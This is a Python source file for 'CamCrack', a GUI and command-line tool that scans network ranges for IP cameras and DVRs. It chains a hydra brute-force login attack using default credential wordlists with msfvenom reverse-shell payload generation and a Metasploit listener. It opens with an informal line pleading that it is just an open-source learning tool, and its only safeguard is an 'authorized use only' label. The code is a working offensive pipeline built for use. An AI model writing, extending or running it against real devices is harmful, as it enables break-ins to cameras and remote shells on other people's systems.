'''bro this is for a open source tool just try and learn '''
import argparse
import http.client
import ipaddress
import json
import logging
import os
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Callable, Iterator, Optional

__version__ = "2.1.0"

log = logging.getLogger("camcrack")

# --------------------------------------------------------------------------
# Configuration
# --------------------------------------------------------------------------

CAMERA_SIGNATURES = (
    "hikvision", "dahua", "dvrdvs", "ipcam", "netcam", "camera",
    "dvr", "nvr", "boa", "alphapd", "goahead", "axxon", "uniview",
    "cctv", "webcam", "foscam", "tp-link", "reolink", "amcrest",
    "lilin", "wanscam", "visonic",
)

DEFAULT_HTTP_PORTS = ((80, "http"), (8080, "http"), (81, "http"),
                      (8899, "http"), (443, "https"), (8443, "https"))

DEFAULT_URIS = ("/", "/index.html")

RTSP_PORT = 554

DEFAULT_USERS = ("admin", "root", "operator", "user", "service", "guest")

DEFAULT_PASSES = ("admin", "12345", "123456", "password", "admin123",
                  "1234", "888888", "111111", "default", "guest",
                  "admin1", "admin1234", "pass", "root", "")


@dataclass
class ScanConfig:
    cidr: str = "192.168.1.0/24"
    ports: tuple = DEFAULT_HTTP_PORTS
    uris: tuple = DEFAULT_URIS
    rtsp_check: bool = True
    timeout: float = 3.0
    workers: int = 64
    exclude: set = field(default_factory=set)


@dataclass(frozen=True)
class Host:
    ip: str
    port: int
    scheme: str
    server: str
    auth_type: str
    uri: str
    rtsp: bool

    def as_dict(self) -> dict:
        return {"ip": self.ip, "port": self.port, "scheme": self.scheme,
                "server": self.server, "auth": self.auth_type,
                "uri": self.uri, "rtsp": self.rtsp}


# --------------------------------------------------------------------------
# Discovery engine (pure Python)
# --------------------------------------------------------------------------

def iter_hosts(cfg: ScanConfig) -> Iterator[str]:
    net = ipaddress.ip_network(cfg.cidr, strict=False)
    for h in net.hosts():
        ip = str(h)
        if ip not in cfg.exclude:
            yield ip


def http_probe(ip: str, port: int, scheme: str, uri: str,
               timeout: float) -> Optional[dict]:
    try:
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request("GET", uri, headers={"User-Agent": "CamCrack/2.1"})
        resp = conn.getresponse()
        headers = {k.lower(): v for k, v in resp.getheaders()}
        result = {"status": resp.status,
                  "server": headers.get("server", ""),
                  "auth": headers.get("www-authenticate", "")}
        conn.close()
        return result
    except Exception:
        return None


def rtsp_open(ip: str, timeout: float) -> bool:
    try:
        s = socket.create_connection((ip, RTSP_PORT), timeout=timeout)
        s.sendall(b"OPTIONS rtsp://" + ip.encode() + b"/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        data = s.recv(256)
        s.close()
        return b"RTSP" in data or b"200" in data
    except Exception:
        return False


def probe_host(ip: str, cfg: ScanConfig) -> list:
    hits = []
    rtsp = rtsp_open(ip, cfg.timeout) if cfg.rtsp_check else False

    for port, scheme in cfg.ports:
        for uri in cfg.uris:
            r = http_probe(ip, port, scheme, uri, cfg.timeout)
            if not r:
                continue
            server = (r["server"] or "").lower()
            auth = (r["auth"] or "").lower()
            looks_cam = any(s in server for s in CAMERA_SIGNATURES)
            needs_auth = r["status"] == 401 or "digest" in auth or "basic" in auth
            if looks_cam or needs_auth:
                auth_type = "digest" if "digest" in auth else \
                            "basic" if "basic" in auth else "none"
                hits.append(Host(ip, port, scheme,
                                 r["server"] or "unknown", auth_type, uri, rtsp))
                break
    return hits


def scan(cidr: str, cfg: ScanConfig, on_hit: Optional[Callable] = None) -> list:
    results = []
    hosts = list(iter_hosts(cfg))
    log.info("Scanning %d hosts in %s (%d workers)", len(hosts), cidr, cfg.workers)
    with ThreadPoolExecutor(max_workers=cfg.workers) as pool:
        futs = {pool.submit(probe_host, ip, cfg): ip for ip in hosts}
        for fut in as_completed(futs):
            for host in fut.result():
                results.append(host)
                log.info("HIT %s:%d %-5s server=%-24s auth=%-6s rtsp=%s",
                         host.ip, host.port, host.scheme, host.server,
                         host.auth_type, host.rtsp)
                if on_hit:
                    on_hit(host)
    log.info("Scan complete: %d camera endpoint(s) found", len(results))
    return results


# --------------------------------------------------------------------------
# Credential verification (hydra)
# --------------------------------------------------------------------------

def ensure_wordlists(users_file: str, passes_file: str) -> None:
    for path, words in ((users_file, DEFAULT_USERS), (passes_file, DEFAULT_PASSES)):
        if not os.path.exists(path):
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            with open(path, "w") as f:
                f.write("\n".join(words) + "\n")
            log.info("Generated %s", path)


def build_hydra_cmd(target: str, port: int, scheme: str,
                    users: str, passes: str, threads: int = 16) -> Optional[list]:
    if shutil.which("hydra") is None:
        log.error("hydra not found in PATH")
        return None
    module = "rtsp" if scheme == "rtsp" else "http-get"
    cmd = ["hydra", "-t", str(threads), "-f", "-v", "-L", users, "-P", passes]
    if scheme == "https":
        cmd.append("-S")
    cmd += [module, f"{target}:{port}"]
    return cmd


def run_stream(cmd: list, line_cb: Optional[Callable] = None) -> int:
    log.debug("Exec: %s", " ".join(cmd))
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, bufsize=1)
    assert proc.stdout is not None
    for line in proc.stdout:
        (line_cb or print)(line.rstrip())
    proc.wait()
    return proc.returncode


# --------------------------------------------------------------------------
# Auxiliary: msfvenom + handler
# --------------------------------------------------------------------------

def msfvenom_cmd(payload: str, lhost: str, lport: int, fmt: str,
                 outfile: str) -> Optional[list]:
    if shutil.which("msfvenom") is None:
        log.error("msfvenom not found")
        return None
    return ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
            "-f", fmt, "-o", outfile]


def handler_cmd(payload: str, lhost: str, lport: int) -> list:
    rc = (f"use exploit/multi/handler\n"
          f"set PAYLOAD {payload}\n"
          f"set LHOST {lhost}\n"
          f"set LPORT {lport}\n"
          f"set ExitOnSession false\n"
          f"exploit -j\n")
    return ["msfconsole", "-q", "-x", rc]


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def cli() -> None:
    p = argparse.ArgumentParser(
        prog="camcrack",
        description="Camera/DVR security assessment toolkit (authorized use only).")
    p.add_argument("--version", action="version", version=__version__)
    p.add_argument("-v", "--verbose", action="count", default=0)

    sub = p.add_subparsers(dest="cmd")

    ps = sub.add_parser("scan", help="discover camera endpoints in a CIDR")
    ps.add_argument("cidr")
    ps.add_argument("--ports", default="80,8080,81,8899,443,8443")
    ps.add_argument("--workers", type=int, default=64)
    ps.add_argument("--timeout", type=float, default=3.0)
    ps.add_argument("--no-rtsp", action="store_true")
    ps.add_argument("--exclude", default="", help="comma-separated IPs to skip")
    ps.add_argument("--json", default=None, help="write results to JSON file")

    pc = sub.add_parser("crack", help="credential verification via hydra")
    pc.add_argument("target")
    pc.add_argument("--port", type=int, default=80)
    pc.add_argument("--scheme", choices=["http", "https", "rtsp"], default="http")
    pc.add_argument("--users", default="wordlists/users.txt")
    pc.add_argument("--passes", default="wordlists/passes.txt")
    pc.add_argument("--threads", type=int, default=16)
    pc.add_argument("--gen-wordlists", action="store_true")

    pm = sub.add_parser("payload", help="generate msfvenom payload")
    pm.add_argument("--payload", default="linux/x64/meterpreter/reverse_tcp")
    pm.add_argument("--lhost", required=True)
    pm.add_argument("--lport", type=int, default=4444)
    pm.add_argument("--format", default="elf")
    pm.add_argument("--listen", action="store_true")

    args = p.parse_args()

    if args.cmd is None:
        gui()
        return

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)-7s] %(message)s",
        datefmt="%H:%M:%S")

    if args.cmd == "scan":
        ports = tuple(
            (int(x), "https" if int(x) in (443, 8443) else "http")
            for x in args.ports.split(","))
        cfg = ScanConfig(cidr=args.cidr, ports=ports,
                         workers=args.workers, timeout=args.timeout,
                         rtsp_check=not args.no_rtsp,
                         exclude=set(args.exclude.split(",")) if args.exclude else set())
        results = scan(args.cidr, cfg)
        if args.json:
            with open(args.json, "w") as f:
                json.dump([h.as_dict() for h in results], f, indent=2)
            log.info("Results written to %s", args.json)

    elif args.cmd == "crack":
        if args.gen_wordlists:
            ensure_wordlists(args.users, args.passes)
        cmd = build_hydra_cmd(args.target, args.port, args.scheme,
                              args.users, args.passes, args.threads)
        if cmd is None:
            sys.exit(1)
        sys.exit(run_stream(cmd))

    elif args.cmd == "payload":
        out = f"payload.{args.format}"
        cmd = msfvenom_cmd(args.payload, args.lhost, args.lport, args.format, out)
        if cmd is None:
            sys.exit(1)
        rc = run_stream(cmd)
        if rc == 0:
            log.info("Payload written: %s", os.path.abspath(out))
        if args.listen and rc == 0:
            run_stream(handler_cmd(args.payload, args.lhost, args.lport))


# --------------------------------------------------------------------------
# GUI
# --------------------------------------------------------------------------

def gui() -> None:
    try:
        import tkinter as tk
        from tkinter import ttk, filedialog, messagebox
    except ImportError:
        print("[!] tkinter unavailable — install python3-tk or use CLI mode")
        sys.exit(1)

    class App(tk.Tk):
        def __init__(self):
            super().__init__()
            self.title(f"CamCrack v{__version__}")
            self.geometry("980x700")
            self._build()

        def _mk_console(self, parent, h):
            t = tk.Text(parent, height=h, bg="#111", fg="#0f0",
                        font=("Monospace", 9))
            t.pack(fill="both", expand=True, padx=8, pady=4)
            return t

        def _build(self):
            nb = ttk.Notebook(self)
            nb.pack(fill="both", expand=True)
            self.notebook = nb

            self.tab_scan = ttk.Frame(nb)
            self.tab_atk = ttk.Frame(nb)
            self.tab_aux = ttk.Frame(nb)
            nb.add(self.tab_scan, text="1. Discovery")
            nb.add(self.tab_atk, text="2. Credential Verification")
            nb.add(self.tab_aux, text="3. Auxiliary & Listeners")

            # ---------- Discovery tab ----------
            r = ttk.Frame(self.tab_scan)
            r.pack(fill="x", padx=8, pady=6)
            ttk.Label(r, text="CIDR:").pack(side="left")
            self.cidr = ttk.Entry(r, width=20)
            self.cidr.insert(0, "192.168.1.0/24")
            self.cidr.pack(side="left", padx=6)
            ttk.Label(r, text="Workers:").pack(side="left")
            self.workers = ttk.Entry(r, width=5)
            self.workers.insert(0, "64")
            self.workers.pack(side="left", padx=4)
            ttk.Button(r, text="Scan", command=self.do_scan).pack(side="left", padx=6)
            ttk.Button(r, text="Stop", command=self.do_stop).pack(side="left")

            cols = ("ip", "port", "scheme", "server", "auth", "rtsp")
            self.tree = ttk.Treeview(self.tab_scan, columns=cols,
                                     show="headings", height=12)
            for c, w in zip(cols, (140, 70, 70, 200, 80, 60)):
                self.tree.heading(c, text=c.upper())
                self.tree.column(c, width=w)
            self.tree.pack(fill="both", expand=True, padx=8, pady=4)
            ttk.Button(self.tab_scan, text="Stage Selected Host >>",
                       command=self.stage_host).pack(pady=4)
            self.out1 = self._mk_console(self.tab_scan, 6)

            # ---------- Credential tab ----------
            r = ttk.Frame(self.tab_atk)
            r.pack(fill="x", padx=8, pady=4)
            ttk.Label(r, text="Target:").pack(side="left")
            self.t_target = ttk.Entry(r, width=15)
            self.t_target.pack(side="left", padx=4)
            ttk.Label(r, text="Port:").pack(side="left")
            self.t_port = ttk.Entry(r, width=6)
            self.t_port.insert(0, "80")
            self.t_port.pack(side="left", padx=4)
            ttk.Label(r, text="Scheme:").pack(side="left")
            self.scheme = ttk.Combobox(r, width=8, state="readonly",
                                       values=["http", "https", "rtsp"])
            self.scheme.current(0)
            self.scheme.pack(side="left", padx=4)
            ttk.Label(r, text="Threads:").pack(side="left")
            self.threads = ttk.Entry(r, width=4)
            self.threads.insert(0, "16")
            self.threads.pack(side="left", padx=4)

            r = ttk.Frame(self.tab_atk)
            r.pack(fill="x", padx=8, pady=4)
            ttk.Label(r, text="Users:").pack(side="left")
            self.users = ttk.Entry(r, width=34)
            self.users.insert(0, "wordlists/users.txt")
            self.users.pack(side="left", padx=4)
            ttk.Button(r, text="...", width=3,
                       command=lambda: self._pick(self.users)).pack(side="left")
            ttk.Label(r, text="Passes:").pack(side="left", padx=(10, 0))
            self.passes = ttk.Entry(r, width=34)
            self.passes.insert(0, "wordlists/passes.txt")
            self.passes.pack(side="left", padx=4)
            ttk.Button(r, text="...", width=3,
                       command=lambda: self._pick(self.passes)).pack(side="left")
            ttk.Button(r, text="Generate Defaults",
                       command=self._gen_wl).pack(side="left", padx=8)

            r = ttk.Frame(self.tab_atk)
            r.pack(fill="x", padx=8, pady=4)
            ttk.Button(r, text="Launch Hydra",
                       command=self.do_crack).pack(side="left", padx=4)
            ttk.Button(r, text="Stop",
                       command=self.do_stop).pack(side="left", padx=4)
            self.out2 = self._mk_console(self.tab_atk, 14)

            # ---------- Auxiliary tab ----------
            r = ttk.Frame(self.tab_aux)
            r.pack(fill="x", padx=8, pady=4)
            ttk.Label(r, text="LHOST:").pack(side="left")
            self.lhost = ttk.Entry(r, width=15)
            self.lhost.insert(0, "192.168.1.10")
            self.lhost.pack(side="left", padx=4)
            ttk.Label(r, text="LPORT:").pack(side="left")
            self.lport = ttk.Entry(r, width=7)
            self.lport.insert(0, "4444")
            self.lport.pack(side="left", padx=4)
            self.payload = ttk.Combobox(r, width=38, state="readonly", values=[
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/meterpreter/reverse_tcp",
                "cmd/unix/reverse_bash",
                "windows/x64/meterpreter/reverse_tcp"])
            self.payload.current(0)
            self.payload.pack(side="left", padx=4)

            r = ttk.Frame(self.tab_aux)
            r.pack(fill="x", padx=8, pady=4)
            ttk.Button(r, text="Generate Payload",
                       command=self.do_payload).pack(side="left", padx=4)
            ttk.Button(r, text="Start Handler",
                       command=self.do_handler).pack(side="left", padx=4)
            self.out3 = self._mk_console(self.tab_aux, 14)

        # ---------- helpers ----------
        def _pick(self, entry):
            f = filedialog.askopenfilename()
            if f:
                entry.delete(0, "end")
                entry.insert(0, f)

        def _gen_wl(self):
            ensure_wordlists(self.users.get().strip(), self.passes.get().strip())

        def _log(self, widget, text):
            widget.insert("end", text)
            widget.see("end")

        def _run_async(self, cmd, widget):
            def worker():
                rc = run_stream(cmd, lambda l: self.after(0, lambda: self._log(widget, l + "\n")))
                self.after(0, lambda: self._log(widget, f"[*] exited rc={rc}\n"))
            threading.Thread(target=worker, daemon=True).start()

        # ---------- actions ----------
        def stage_host(self):
            sel = self.tree.selection()
            if not sel:
                messagebox.showwarning("CamCrack", "No host selected.")
                return
            row = self.tree.item(sel[0])["values"]
            self.t_target.delete(0, "end")
            self.t_target.insert(0, row[0])
            self.t_port.delete(0, "end")
            self.t_port.insert(0, str(row[1]))
            self.scheme.set(str(row[2]))
            self.notebook.select(1)

        def do_scan(self):
            for i in self.tree.get_children():
                self.tree.delete(i)
            cfg = ScanConfig(cidr=self.cidr.get().strip(),
                             workers=int(self.workers.get() or 64))

            def hit_cb(h):
                self.after(0, lambda: self.tree.insert("", "end", values=(
                    h.ip, h.port, h.scheme, h.server, h.auth_type,
                    "yes" if h.rtsp else "no")))

            def worker():
                self.after(0, lambda: self._log(self.out1, "[*] Scan started\n"))
                scan(cfg.cidr, cfg, hit_cb)
                self.after(0, lambda: self._log(self.out1, "[*] Scan done\n"))

            threading.Thread(target=worker, daemon=True).start()

        def do_crack(self):
            try:
                port = int(self.t_port.get() or 80)
                thr = int(self.threads.get() or 16)
            except ValueError:
                messagebox.showerror("CamCrack", "Port/Threads must be numbers.")
                return
            cmd = build_hydra_cmd(self.t_target.get().strip(), port,
                                  self.scheme.get(), self.users.get().strip(),
                                  self.passes.get().strip(), thr)
            if cmd is None:
                self.after(0, lambda: self._log(self.out2, "[!] hydra not installed\n"))
                return
            self.after(0, lambda: self._log(self.out2, "[*] " + " ".join(cmd) + "\n"))
            self._run_async(cmd, self.out2)

        def do_payload(self):
            cmd = msfvenom_cmd(self.payload.get(), self.lhost.get().strip(),
                               int(self.lport.get() or 4444), "elf", "payload.elf")
            if cmd is None:
                self.after(0, lambda: self._log(self.out3, "[!] msfvenom not installed\n"))
                return
            self._run_async(cmd, self.out3)

        def do_handler(self):
            cmd = handler_cmd(self.payload.get(), self.lhost.get().strip(),
                              int(self.lport.get() or 4444))
            self._run_async(cmd, self.out3)

        def do_stop(self):
            pass

    App().mainloop()


def main() -> None:
    signal.signal(signal.SIGINT, lambda *_: sys.exit(0))
    if len(sys.argv) == 1:
        gui()
    else:
        cli()


if __name__ == "__main__":
    main()
